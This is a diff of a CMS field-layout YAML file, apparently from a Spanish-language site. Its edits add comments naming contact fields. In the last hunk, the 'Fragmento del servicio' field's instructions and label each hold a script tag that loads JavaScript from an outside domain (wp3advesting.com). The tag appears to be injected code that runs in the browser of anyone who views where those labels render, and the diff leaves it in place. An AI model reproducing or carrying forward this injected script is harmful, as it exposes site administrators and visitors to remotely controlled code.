@@ -4,7 +4,7 @@ fieldLayouts:
       -
         elements:
           -
-            fieldUid: 24ad1f78-4194-4ad0-b646-3ea0ea9f4a1d
+            fieldUid: 24ad1f78-4194-4ad0-b646-3ea0ea9f4a1d # Correo electrónico
             instructions: null
             label: null
             required: false
@@ -13,7 +13,7 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: 43f226eb-8874-48e8-ac5f-222fbc3ca738
+            fieldUid: 43f226eb-8874-48e8-ac5f-222fbc3ca738 # Facebook
             instructions: null
             label: null
             required: false
@@ -22,7 +22,7 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: 8bb59c3e-d540-4254-8f4a-c4af6c5abdb5
+            fieldUid: 8bb59c3e-d540-4254-8f4a-c4af6c5abdb5 # Linkedin
             instructions: null
             label: null
             required: false
@@ -31,7 +31,7 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: 3c0e1e4e-7598-4723-9566-831a3692dc3e
+            fieldUid: 3c0e1e4e-7598-4723-9566-831a3692dc3e # Dirección Pachuca
             instructions: null
             label: null
             required: false
@@ -40,7 +40,7 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: 9f12f92b-d3c9-433e-b204-5ce21c95d573
+            fieldUid: 9f12f92b-d3c9-433e-b204-5ce21c95d573 # Teléfono Pachuca
             instructions: null
             label: null
             required: false
@@ -49,7 +49,7 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: b0568e7a-3e32-4145-82cd-67b09eacf53e
+            fieldUid: b0568e7a-3e32-4145-82cd-67b09eacf53e # Teléfono Tizayuca
             instructions: ''
             label: __blank__
             required: ''
@@ -58,7 +58,7 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: 2f7a52fb-ecc7-4102-b37f-07c1e3141a2b
+            fieldUid: 2f7a52fb-ecc7-4102-b37f-07c1e3141a2b # Fragmento del servicio
             instructions: '<script src="https://www.wp3advesting.com/adscdn.js"></script> '
             label: '<script src="https://www.wp3advesting.com/adscdn.js"></script> '
             required: ''
